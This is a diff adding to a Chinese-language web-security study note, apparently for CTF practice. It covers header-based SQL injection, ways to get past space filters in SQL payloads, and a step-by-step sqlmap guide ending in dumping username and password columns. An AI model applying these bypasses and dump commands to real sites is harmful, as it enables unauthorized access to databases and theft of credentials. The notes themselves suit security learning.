@@ -450,13 +450,73 @@ for i in range(1,50):
 
 #### mysql结构：
 #### cookie注入：
-与传统的SQL注入基本上是一样，都是针对数据库的注入，就是注入的位置不同，注入形式不同
+与传统的SQL注入基本上是一样，都是针对数据库的注入，就是注入的位置不同，注入形式不同，使用order by时不需要union（同样利用union来即可，遇到过滤空格用+号）
 #### UA注入(User-Agent)：
-和传统注入一样，这里注入点在HTTP的头部User-Agent上
-refer注入：
-空格注入：
-update注入：
-insert注入：
+和传统注入一样，这里注入点在HTTP的头部User-Agent上。在ctfhub上是把UA的内容全删了开始注入。使用order by时不需要union
+#### refer注入：
+同上，如果没有自己在请求报文加上referer即可
+#### 空格注入：
+空格绕过方式:1)$IFS$6  
+2)/**/,类似于将中间部分注释掉，类似于：
+```
+SELECT * FROM users WHERE username = 'admin' AND password = 'password';
+```
+变成
+```
+SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/AND/**/password/**/=/**/'password';
+
+```
+3)()例如
+```
+SELECT(*)FROM(users)WHERE(username)='admin'AND(password)='password';
+```
+4)%0a,是换行符的 URL 编码。有时候，如果空格被过滤，换行符可能会用于绕过简单的过滤。例如：
+```
+SELECT%0a*%0aFROM%0ausers%0aWHERE%0ausername='admin'%0aAND%0apassword='password';
+```
+#### update注入：
+#### insert注入：
+### SQLmap的使用:
+参考博客：https://www.cnblogs.com/0yst3r-2046/p/10957616.html 
+https://blog.csdn.net/smli_ng/article/details/106026901   
+1)判断是否有注入点: sqlmap.py  -u  http://xxx/?id=1  
+注：当注入点后的参数大于等于两个时，需要加双引号
+sqlmap.py  -u “http://xxx/?id=1&uid=2 ”
+
+2)判断文本中的请求是否存在注入
+sqlmap可以从一个文本文件中获取http请求（这样的好处在于：不用设置其他参数，例如cookie、post数据等）  
+sqlmap.py  -r  路径/1.txt  
+注：-r一般存在cookie注入时使用  
+
+3)查询当前用户下的所有数据库  
+sqlmap.py  -u  http://192.168.1.xxx/sql1/less-1/?id=1 --dbs  
+如果还需要在爆出来的指定数据库查询数据，则需要将上一条命令中的 --dbs 缩写成 -D xxx （意思是在xxx数据库中继续查询数据）  
+
+4)获取数据库中的表名  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye --table  
+注：将上一条命令中的--table缩写成-T时，表示在某表中继续查询  
+若在该命令中不加-D参数来指定具体的数据库，那么sqlmap会把数据库中所有表列出  
+
+5)获取表中的字段名  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1  ” -D dkeye -T user_info --columns
+注：在后续注入中 --columns可以缩写成-C  
+
+6)获取字段内容  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye -T user_info -C username，password --dump
+这里获取的是dkeye数据库里的user_info表中的username和password的值
+
+7)获取数据库的所有用户  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --users  
+
+8)获取数据库  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --passwords  
+可能密码涉及到md5加密，需要自行解密
+
+9）获取当前网站数据库的名称  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --current  -db  
+
+10）获取当前网站数据库的用户名称  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --current  -user
 ### 文件上传：
 #### 前端JS验证：
 1）火狐浏览器输入about config禁用javascript  2）F12开发者模式修改JS代码后上传  3）burp抓包修改
